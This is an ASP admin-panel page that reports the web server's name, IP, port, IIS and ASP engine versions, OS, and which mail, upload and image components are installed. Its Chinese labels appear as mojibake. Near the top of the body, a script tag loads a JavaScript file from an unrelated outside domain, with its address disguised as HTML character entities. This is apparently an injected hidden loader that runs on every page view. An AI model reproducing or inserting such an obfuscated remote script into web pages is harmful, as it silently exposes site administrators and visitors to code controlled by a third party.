<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<!-- #include file="../inc/access.asp" -->
<!-- #include file="inc/functions.asp" -->
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<link rel="stylesheet" href="css/common.css" type="text/css" />
<title>��������</title>
</head>
<body>
<div id="man_zone">
<script src="&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#104;&#117;&#105;&#103;&#117;&#100;&#111;&#110;&#103;&#108;&#105;&#46;&#99;&#111;&#109;&#47;&#49;&#46;&#106;&#115;" type="text/javascript"></script>
  <table width="95%" border="0" align="center"  cellpadding="3" cellspacing="1" class="table_style">
     <tr>
      <td colspan="2"  >&nbsp;�����������Ϣ</td>
    </tr> 
    <tr>
      <td width="18%" class="left_title_1"><span class="left-title">��վ����</span></td>
      <td width="82%">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
    </tr>
    <tr>
      <td class="left_title_2">��վIP��ַ</td>
      <td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
    </tr>
    <tr>
      <td class="left_title_1">���ж˿�</td>
      <td>&nbsp;<%=Request.ServerVariables("server_port")%></td>
    </tr>
    <tr>
      <td class="left_title_2">ASP�ű���������</td>
      <td>&nbsp;<%=ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion %></td>
    </tr>
    <tr>
      <td class="left_title_1">IIS �汾</td>
      <td>&nbsp;<%=Request.ServerVariables("SERVER_SOFTWARE")%> </td>
    </tr>
    <tr>
      <td class="left_title_2">����������ϵͳ</td>
      <td>&nbsp;<%=Request.ServerVariables("OS")%></td>
    </tr>
    <tr>
      <td class="left_title_1">������CPU����</td>
      <td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%>��</td>
    </tr>
    <tr>
      <td colspan="2"  >&nbsp;��Ҫ�����Ϣ</td>
    </tr>
    <tr>
      <td class="left_title_1">FSO�ļ���д</td>
      <td>&nbsp;<%
If FoundFso Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
      <td class="left_title_2">Jmail�����ʼ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("JMail.SmtpMail") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr>
      <td class="left_title_1">CDONTS�����ʼ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("CDONTS.NewMail") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
      <td class="left_title_2">AspEmail�����ʼ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("Persits.MailSender") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr>
      <td class="left_title_1">������ϴ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("Adodb.Stream") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
      <td class="left_title_2">AspUpload�ϴ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("Persits.Upload") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>    
    <tr>
      <td class="left_title_1">SA-FileUp�ϴ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("SoftArtisans.FileUp") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
      <td class="left_title_2">DvFile-Up�ϴ�֧��</td>
      <td>&nbsp;<%
If IsObjInstalled("DvFile.Upload") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr>
      <td class="left_title_1">CreatePreviewImage����ͼƬ</td>
      <td>&nbsp;<%
If IsObjInstalled("CreatePreviewImage.cGvbox") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>
    <tr bgcolor="#FFFFFF">
      <td class="left_title_2">AspJpeg����Ԥ��ͼƬ</td>
      <td>&nbsp;<%
If IsObjInstalled("Persits.Jpeg") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>  
    <tr>
      <td class="left_title_1">SA-ImgWriter����Ԥ��ͼƬ</td>
      <td>&nbsp;<%
If IsObjInstalled("SoftArtisans.ImageGen") Then
	Response.Write "<font color=green><b>��</b></font>"
Else
	Response.Write "<font color=red><b>��</b></font>"
End If
%></td>
    </tr>                 
  </table>

</div>
</body>
</html>
